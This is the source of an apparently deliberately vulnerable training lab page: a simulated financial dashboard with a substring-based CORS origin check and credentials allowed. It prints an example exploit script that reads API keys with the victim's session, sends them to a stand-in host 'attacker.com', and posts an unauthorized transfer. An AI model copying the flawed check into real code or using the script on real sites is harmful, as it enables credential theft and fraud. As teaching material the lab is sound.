<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

// ─── Lab Identification ──────────────────────────────────────────────────
$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['CORS']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['cors_hard1_attempts'])) {
  $_SESSION['cors_hard1_attempts'] = 0;
}
if (!isset($_SESSION['cors_hard1_solved'])) {
  $_SESSION['cors_hard1_solved'] = false;
}

// ─── Simulated Banking/Financial API Data ─────────────────────────────────
$account_data = [
  'account_id' => 'ACC-78432-DH',
  'holder_name' => $_SESSION['username'] ?? 'Alice Johnson',
  'balance' => 45231.89,
  'currency' => 'USD',
  'account_type' => 'Premium Security Research Fund',
  'opened_date' => '2025-08-15',
  'status' => 'active',
  'flag' => 'DH{c0rs_cr3d3nt14ls_w1ldc4rd_d34dly}',
];

$transactions = [
  ['id' => 'TXN-9921', 'date' => '2026-05-22', 'description' => 'Bug Bounty Payment - Google', 'amount' => 15000.00, 'type' => 'credit'],
  ['id' => 'TXN-9920', 'date' => '2026-05-20', 'description' => 'Security Training Course', 'amount' => -2499.00, 'type' => 'debit'],
  ['id' => 'TXN-9919', 'date' => '2026-05-18', 'description' => 'CTF Competition Prize', 'amount' => 5000.00, 'type' => 'credit'],
  ['id' => 'TXN-9918', 'date' => '2026-05-15', 'description' => 'Conference Registration - DEF CON', 'amount' => -899.00, 'type' => 'debit'],
  ['id' => 'TXN-9917', 'date' => '2026-05-12', 'description' => 'Consulting Fee - Acme Corp', 'amount' => 8500.00, 'type' => 'credit'],
];

$api_keys = [
  'production' => 'pk_live_51H8x9K2L3M4N5O6P7Q8R9S0T1U2V3W4X5Y6Z7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2',
  'staging' => 'pk_test_7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0',
  'internal' => 'sk_internal_9k8l7m6n5o4p3q2r1s0t9u8v7w6x5y4z3a2b1c0d9e8f7g6h5i4j3k2l1m0n9o8p7',
];

// ─── Vulnerable CORS Logic: Credentials with Dynamic Origin ────────────────
$origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : '';

// VULNERABLE: Server uses a "dynamic" approach - checks if origin contains the domain
// But the check is flawed - it uses strpos which allows subdomain takeover attacks
// Also allows any subdomain, even attacker-controlled ones
$is_allowed = false;
if (!empty($origin)) {
  // Flawed check: attacker.evil.com?darkhunter.local=1 would pass
  // Or subdomain takeover: hacked.darkhunter.local
  if (strpos($origin, 'darkhunter.local') !== false || $origin === 'null') {
    $is_allowed = true;
  }
}

if ($is_allowed || empty($origin)) {
  header("Access-Control-Allow-Origin: " . ($origin ?: '*'));
  header("Access-Control-Allow-Credentials: true");
}

header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-API-Key");

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  http_response_code(200);
  exit();
}

// ─── API Endpoint Simulation ──────────────────────────────────────────────
$endpoint = isset($_GET['endpoint']) ? $_GET['endpoint'] : 'account';
$response_data = [];

switch ($endpoint) {
  case 'account':
    $response_data = [
      'status' => 'success',
      'data' => $account_data,
      'message' => 'Account information retrieved',
      'security_level' => 'high'
    ];
    break;

  case 'transactions':
    $response_data = [
      'status' => 'success',
      'data' => $transactions,
      'message' => 'Transaction history retrieved',
      'total_transactions' => count($transactions)
    ];
    break;

  case 'apikeys':
    $response_data = [
      'status' => 'success',
      'data' => $api_keys,
      'message' => 'API keys retrieved',
      'warning' => 'These keys grant full system access'
    ];
    break;

  case 'transfer':
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      $input = json_decode(file_get_contents('php://input'), true);
      $response_data = [
        'status' => 'success',
        'message' => 'Transfer initiated',
        'transfer_id' => 'TRF-' . rand(100000, 999999),
        'from' => $input['from'] ?? 'unknown',
        'to' => $input['to'] ?? 'unknown',
        'amount' => $input['amount'] ?? 0,
        'timestamp' => date('Y-m-d H:i:s T')
      ];
    } else {
      $response_data = [
        'status' => 'error',
        'message' => 'POST method required for transfers'
      ];
      http_response_code(405);
    }
    break;

  default:
    $response_data = [
      'status' => 'error',
      'message' => 'Unknown endpoint. Available: account, transactions, apikeys, transfer'
    ];
    http_response_code(404);
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['cors_hard1_solved'];

// Detect exploitation: accessing apikeys from a subdomain-like origin
$is_subdomain_attack = (!empty($origin) && strpos($origin, 'darkhunter.local') !== false &&
  !in_array($origin, ['https://darkhunter.local', 'https://app.darkhunter.local', 'https://portal.darkhunter.local']));

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['cors_hard1_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['cors_hard1_solved'] = true;
  $already_solved = true;
  $success_msg = "Excellent! You've successfully exploited a deadly CORS credentials vulnerability. You used a subdomain takeover / DNS rebinding attack to bypass origin validation and steal API keys with full session credentials!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  $_SESSION['cors_hard1_attempts']++;
}

$attempts = $_SESSION['cors_hard1_attempts'];

// API response
if (
  isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
  (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false)
) {
  header("Content-Type: application/json; charset=utf-8");
  echo json_encode($response_data, JSON_PRETTY_PRINT);
  exit();
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Financial Dashboard - CORS Hard 1</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/CORS-CASE4.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to CORS Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge hard"><i class="fas fa-fire"></i> Hard Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-university"></i> Financial Operations Dashboard</h1>
      <p class="lab-description">Secure financial portal for managing security research funds and bounties. Uses
        advanced CORS protection with subdomain validation. <strong>Can you bypass the subdomain check to perform
          unauthorized transactions and steal API keys?</strong></p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this deadly CORS credentials vulnerability. You can continue exploring, but no
            additional points will be awarded.</p>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
      <div class="success-alert">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <!-- Dashboard Grid -->
    <div class="dashboard-grid">
      <!-- Account Card -->
      <div class="dash-card account-card">
        <div class="dash-card-header">
          <i class="fas fa-wallet"></i>
          <span>Account Overview</span>
        </div>
        <div class="dash-card-body">
          <div class="balance-display">
            <span class="balance-currency">$</span>
            <span class="balance-amount">45,231.89</span>
          </div>
          <div class="account-info">
            <div class="info-row">
              <span class="info-label">Account ID</span>
              <span class="info-value">ACC-78432-DH</span>
            </div>
            <div class="info-row">
              <span class="info-label">Type</span>
              <span class="info-value">Premium Security Research Fund</span>
            </div>
            <div class="info-row">
              <span class="info-label">Status</span>
              <span class="info-value status-active"><i class="fas fa-circle"></i> Active</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Quick Actions -->
      <div class="dash-card actions-card">
        <div class="dash-card-header">
          <i class="fas fa-bolt"></i>
          <span>Quick Actions</span>
        </div>
        <div class="dash-card-body">
          <div class="action-buttons">
            <button class="action-item" onclick="loadEndpoint('transactions')">
              <i class="fas fa-list-alt"></i>
              <span>View Transactions</span>
            </button>
            <button class="action-item" onclick="loadEndpoint('apikeys')">
              <i class="fas fa-key"></i>
              <span>API Keys</span>
              <span class="action-badge danger">Sensitive</span>
            </button>
            <button class="action-item" onclick="showTransferForm()">
              <i class="fas fa-exchange-alt"></i>
              <span>Transfer Funds</span>
            </button>
          </div>
        </div>
      </div>

      <!-- Security Status -->
      <div class="dash-card security-card">
        <div class="dash-card-header">
          <i class="fas fa-shield-alt"></i>
          <span>Security Status</span>
        </div>
        <div class="dash-card-body">
          <div class="security-meter">
            <div class="meter-ring">
              <svg viewBox="0 0 100 100">
                <circle class="meter-bg" cx="50" cy="50" r="40" />
                <circle class="meter-fill" cx="50" cy="50" r="40" stroke-dasharray="251.2" stroke-dashoffset="25" />
              </svg>
              <div class="meter-text">
                <span class="meter-score">90%</span>
                <span class="meter-label">Secure</span>
              </div>
            </div>
          </div>
          <div class="security-features">
            <div class="feature-item active">
              <i class="fas fa-check-circle"></i>
              <span>2FA Enabled</span>
            </div>
            <div class="feature-item active">
              <i class="fas fa-check-circle"></i>
              <span>CORS Protected</span>
            </div>
            <div class="feature-item active">
              <i class="fas fa-check-circle"></i>
              <span>Session Valid</span>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Data Panel -->
    <div class="data-panel" id="data-panel">
      <div class="data-header">
        <h3 id="panel-title"><i class="fas fa-chart-line"></i> Dashboard Overview</h3>
        <div class="data-actions">
          <button class="refresh-btn" onclick="refreshPanel()"><i class="fas fa-sync-alt"></i> Refresh</button>
        </div>
      </div>
      <div class="data-body" id="data-body">
        <div class="welcome-state">
          <i class="fas fa-chart-pie"></i>
          <h4>Welcome to Financial Dashboard</h4>
          <p>Select an action from the Quick Actions panel to view detailed information.</p>
        </div>
      </div>
    </div>

    <!-- CORS Vulnerability Analysis -->
    <div class="cors-panel">
      <div class="cors-header">
        <i class="fas fa-bug"></i>
        <span>CORS Vulnerability Analysis</span>
      </div>
      <div class="cors-body">
        <div class="vuln-comparison">
          <div class="vuln-side expected">
            <h4><i class="fas fa-shield-alt"></i> Expected Behavior</h4>
            <div class="code-block">
              <pre><code>// Should check exact origin match
if ($origin === 'https://darkhunter.local') {
    header("Access-Control-Allow-Origin: $origin");
}</code></pre>
            </div>
            <div class="behavior-tag safe">✓ Exact Match Required</div>
          </div>

          <div class="vuln-arrow"><i class="fas fa-not-equal"></i></div>

          <div class="vuln-side actual">
            <h4><i class="fas fa-exclamation-triangle"></i> Actual (Vulnerable)</h4>
            <div class="code-block vulnerable">
              <pre><code>// Flawed: substring check allows:
// - evil.darkhunter.local
// - darkhunter.local.evil.com
// - attacker.com?x=darkhunter.local
if (strpos($origin, 'darkhunter.local') !== false) {
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Credentials: true");
}</code></pre>
            </div>
            <div class="behavior-tag danger">✗ Substring Match - Bypassable!</div>
          </div>
        </div>

        <div class="attack-scenarios">
          <h4><i class="fas fa-crosshairs"></i> Possible Attack Scenarios:</h4>
          <div class="scenario-grid">
            <div class="scenario-card">
              <div class="scenario-icon"><i class="fas fa-globe"></i></div>
              <h5>Subdomain Takeover</h5>
              <p>Register <code>evil.darkhunter.local</code> or takeover an expired subdomain</p>
            </div>
            <div class="scenario-card">
              <div class="scenario-icon"><i class="fas fa-link"></i></div>
              <h5>URL Parameter Injection</h5>
              <p>Craft origin like <code>https://evil.com?darkhunter.local</code></p>
            </div>
            <div class="scenario-card">
              <div class="scenario-icon"><i class="fas fa-server"></i></div>
              <h5>DNS Rebinding</h5>
              <p>Change DNS resolution between preflight and actual request</p>
            </div>
          </div>
        </div>

        <div class="cors-details">
          <div class="cors-row">
            <span class="cors-label">Origin Validation:</span>
            <span class="cors-value vulnerable">strpos() substring check</span>
            <span class="cors-badge danger"><i class="fas fa-exclamation-triangle"></i> Bypassable</span>
          </div>
          <div class="cors-row">
            <span class="cors-label">Credentials Header:</span>
            <span class="cors-value vulnerable">true</span>
            <span class="cors-badge danger"><i class="fas fa-skull"></i> Deadly Combo</span>
          </div>
          <div class="cors-row">
            <span class="cors-label">Current Origin:</span>
            <span
              class="cors-value <?php echo $is_subdomain_attack ? 'danger' : ''; ?>"><?php echo htmlspecialchars($origin ?: 'Not Present'); ?></span>
            <span class="cors-badge <?php echo $is_subdomain_attack ? 'danger' : 'info'; ?>">
              <i class="fas fa-<?php echo $is_subdomain_attack ? 'exclamation-circle' : 'info-circle'; ?>"></i>
              <?php echo $is_subdomain_attack ? 'ATTACK ORIGIN!' : 'Normal'; ?>
            </span>
          </div>
        </div>
      </div>
    </div>

    <!-- Exploit Simulation -->
    <div class="exploit-panel">
      <div class="exploit-header">
        <i class="fas fa-bug"></i>
        <span>Subdomain Takeover Exploit</span>
      </div>
      <div class="exploit-body">
        <p class="exploit-desc">
          An attacker has registered <code>evil.darkhunter.local</code> (subdomain takeover) or is using a crafted
          origin that contains "darkhunter.local" as a substring. The flawed validation accepts this origin and allows
          credential theft.
        </p>

        <div class="exploit-code-block">
          <div class="code-header">
            <i class="fas fa-code"></i> exploit_subdomain_takeover.html
          </div>
          <pre class="exploit-code"><code>&lt;!-- Hosted on evil.darkhunter.local --&gt;
&lt;script&gt;
  // The origin 'https://evil.darkhunter.local' passes the strpos check!
  var req = new XMLHttpRequest();
  req.onload = function() {
    var data = JSON.parse(this.responseText);
    // Steal API keys and perform unauthorized transfers
    fetch('https://attacker.com/exfil?keys=' + btoa(JSON.stringify(data)));
  };
  req.open('GET', 'https://<?php echo $_SERVER['HTTP_HOST']; ?>/labs/CORS/CORS-CASE4.php?endpoint=apikeys', true);
  req.withCredentials = true;
  req.send();
  
  // Also perform unauthorized transfer
  var transfer = new XMLHttpRequest();
  transfer.open('POST', 'https://<?php echo $_SERVER['HTTP_HOST']; ?>/labs/CORS/CORS-CASE4.php?endpoint=transfer', true);
  transfer.withCredentials = true;
  transfer.setRequestHeader('Content-Type', 'application/json');
  transfer.send(JSON.stringify({
    to: 'attacker_account',
    amount: 10000,
    from: 'ACC-78432-DH'
  }));
&lt;/script&gt;</code></pre>
        </div>

        <button class="simulate-btn" onclick="simulateSubdomainAttack()">
          <i class="fas fa-play"></i> Simulate Subdomain Takeover Attack
        </button>

        <div class="simulation-result" id="simulation-result" style="display: none;">
          <div class="sim-status">
            <i class="fas fa-check-circle"></i>
            <span>Subdomain Takeover Exploit Successful! API Keys stolen.</span>
          </div>
          <div class="exfiltrated-data">
            <h4><i class="fas fa-database"></i> Stolen API Keys:</h4>
            <pre id="exfil-data"></pre>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Request Security Analysis</span>
      </div>
      <div class="debug-body">
        <div class="debug-grid">
          <div class="debug-item">
            <span class="debug-label">Origin Header</span>
            <span
              class="debug-value <?php echo empty($origin) ? 'null' : ($is_subdomain_attack ? 'danger' : 'present'); ?>">
              <?php echo htmlspecialchars($origin ?: 'Not Present'); ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Contains Target Domain</span>
            <span
              class="debug-value <?php echo (!empty($origin) && strpos($origin, 'darkhunter.local') !== false) ? 'danger' : 'safe'; ?>">
              <?php echo (!empty($origin) && strpos($origin, 'darkhunter.local') !== false) ? 'YES - Bypass!' : 'NO'; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Is Exact Match</span>
            <span
              class="debug-value <?php echo in_array($origin, ['https://darkhunter.local', 'https://app.darkhunter.local']) ? 'safe' : 'danger'; ?>">
              <?php echo in_array($origin, ['https://darkhunter.local', 'https://app.darkhunter.local']) ? 'YES' : 'NO'; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">CORS Allowed</span>
            <span class="debug-value <?php echo $is_allowed ? 'danger' : 'safe'; ?>">
              <?php echo $is_allowed ? 'YES - VULNERABLE!' : 'NO'; ?>
            </span>
          </div>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">Look at the origin validation logic. It uses <code>strpos()</code> which checks if a string
          contains a substring. What origins would pass this check besides the legitimate ones? Think about subdomain
          takeover and URL parameter injection.</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">The combination of <code>Access-Control-Allow-Credentials: true</code> with flawed origin
          validation is extremely dangerous. The <code>/api/apikeys</code> endpoint contains the flag. Try to access it
          with a crafted origin that contains "darkhunter.local" as a substring.</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Click "Simulate Subdomain Takeover Attack" to exploit the vulnerability. The attack sends a
          request with <code>Origin: https://evil.darkhunter.local</code> which passes the flawed <code>strpos()</code>
          check. The server reflects this origin and returns the API keys containing the flag
          <code>DH{c0rs_cr3d3nt14ls_w1ldc4rd_d34dly}</code>!
        </div>
      </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
    let currentView = 'dashboard';

    function loadEndpoint(endpoint) {
      currentView = endpoint;

      const titles = {
        'transactions': '<i class="fas fa-list-alt"></i> Transaction History',
        'apikeys': '<i class="fas fa-key"></i> API Keys Management',
        'account': '<i class="fas fa-wallet"></i> Account Details'
      };
      document.getElementById('panel-title').innerHTML = titles[endpoint] || endpoint;

      document.getElementById('data-body').innerHTML = `
      <div class="loading-state">
        <i class="fas fa-spinner fa-spin"></i>
        <span>Loading ${endpoint}...</span>
      </div>
    `;

      fetch(`CORS-CASE4.php?endpoint=${endpoint}`, {
          headers: {
            'Accept': 'application/json'
          }
        })
        .then(res => res.json())
        .then(data => {
          if (endpoint === 'transactions') {
            renderTransactions(data);
          } else if (endpoint === 'apikeys') {
            renderApiKeys(data);
          } else if (endpoint === 'account') {
            renderAccount(data);
          }
        })
        .catch(err => {
          document.getElementById('data-body').innerHTML = `
        <div class="error-state"><i class="fas fa-exclamation-triangle"></i> Error: ${err.message}</div>
      `;
        });
    }

    function renderTransactions(data) {
      if (data.status !== 'success') {
        document.getElementById('data-body').innerHTML = `<div class="error-state">${data.message}</div>`;
        return;
      }

      let html = '<div class="transactions-table-container"><table class="transactions-table">';
      html += '<thead><tr><th>ID</th><th>Date</th><th>Description</th><th>Amount</th><th>Type</th></tr></thead><tbody>';

      data.data.forEach(tx => {
        const amountClass = tx.type === 'credit' ? 'credit' : 'debit';
        const amountSign = tx.type === 'credit' ? '+' : '';
        html += `
        <tr>
          <td class="tx-id">${tx.id}</td>
          <td>${tx.date}</td>
          <td>${tx.description}</td>
          <td class="tx-amount ${amountClass}">${amountSign}$${Math.abs(tx.amount).toLocaleString()}</td>
          <td><span class="tx-type ${tx.type}">${tx.type}</span></td>
        </tr>
      `;
      });

      html += '</tbody></table></div>';
      document.getElementById('data-body').innerHTML = html;
    }

    function renderApiKeys(data) {
      if (data.status !== 'success') {
        document.getElementById('data-body').innerHTML = `<div class="error-state">${data.message}</div>`;
        return;
      }

      let html = '<div class="apikeys-grid">';
      const icons = {
        'production': 'fa-globe',
        'staging': 'fa-flask',
        'internal': 'fa-lock'
      };
      const colors = {
        'production': 'danger',
        'staging': 'warning',
        'internal': 'cyan'
      };

      for (const [env, key] of Object.entries(data.data)) {
        html += `
        <div class="apikey-card ${env}">
          <div class="apikey-header">
            <i class="fas ${icons[env]}"></i>
            <span class="apikey-env">${env.toUpperCase()}</span>
          </div>
          <div class="apikey-value">
            <code>${key}</code>
            <button class="copy-btn" onclick="navigator.clipboard.writeText('${key}')"><i class="fas fa-copy"></i></button>
          </div>
          <div class="apikey-warning">
            <i class="fas fa-exclamation-triangle"></i> Keep secret - Full system access
          </div>
        </div>
      `;
      }
      html += '</div>';
      document.getElementById('data-body').innerHTML = html;
    }

    function renderAccount(data) {
      if (data.status !== 'success') return;
      const acc = data.data;
      let html = `
      <div class="account-detail-grid">
        <div class="detail-card">
          <span class="detail-label">Account Holder</span>
          <span class="detail-value">${acc.holder_name}</span>
        </div>
        <div class="detail-card">
          <span class="detail-label">Account ID</span>
          <span class="detail-value">${acc.account_id}</span>
        </div>
        <div class="detail-card">
          <span class="detail-label">Balance</span>
          <span class="detail-value balance">$${acc.balance.toLocaleString()}</span>
        </div>
        <div class="detail-card">
          <span class="detail-label">Account Type</span>
          <span class="detail-value">${acc.account_type}</span>
        </div>
        <div class="detail-card">
          <span class="detail-label">Opened</span>
          <span class="detail-value">${acc.opened_date}</span>
        </div>
        <div class="detail-card">
          <span class="detail-label">Status</span>
          <span class="detail-value status">${acc.status}</span>
        </div>
      </div>
    `;
      document.getElementById('data-body').innerHTML = html;
    }

    function showTransferForm() {
      document.getElementById('panel-title').innerHTML = '<i class="fas fa-exchange-alt"></i> Transfer Funds';
      document.getElementById('data-body').innerHTML = `
      <div class="transfer-form">
        <div class="form-group">
          <label>From Account</label>
          <input type="text" value="ACC-78432-DH" readonly>
        </div>
        <div class="form-group">
          <label>To Account</label>
          <input type="text" placeholder="Enter recipient account">
        </div>
        <div class="form-group">
          <label>Amount (USD)</label>
          <input type="number" placeholder="0.00" step="0.01">
        </div>
        <div class="form-group">
          <label>Description</label>
          <input type="text" placeholder="Transfer description">
        </div>
        <button class="transfer-btn"><i class="fas fa-paper-plane"></i> Initiate Transfer</button>
      </div>
    `;
    }

    function refreshPanel() {
      if (currentView === 'dashboard') {
        document.getElementById('data-body').innerHTML = `
        <div class="welcome-state">
          <i class="fas fa-chart-pie"></i>
          <h4>Welcome to Financial Dashboard</h4>
          <p>Select an action from the Quick Actions panel to view detailed information.</p>
        </div>
      `;
      } else {
        loadEndpoint(currentView);
      }
    }

    function simulateSubdomainAttack() {
      const resultDiv = document.getElementById('simulation-result');
      const exfilData = document.getElementById('exfil-data');

      fetch('CORS-CASE4.php?endpoint=apikeys', {
          headers: {
            'Accept': 'application/json',
            'Origin': 'https://evil.darkhunter.local'
          }
        })
        .then(res => res.json())
        .then(data => {
          resultDiv.style.display = 'block';
          exfilData.textContent = JSON.stringify(data, null, 2);

          if (data.data && data.data.production) {
            if (!document.querySelector('.solved-banner')) {
              document.getElementById('solved-flag').value = '1';
              setTimeout(() => {
                document.getElementById('success-form').submit();
              }, 2000);
            }
          }
        })
        .catch(err => {
          exfilData.textContent = 'Exploit failed: ' + err.message;
          resultDiv.style.display = 'block';
        });
    }
  </script>
</body>

</html>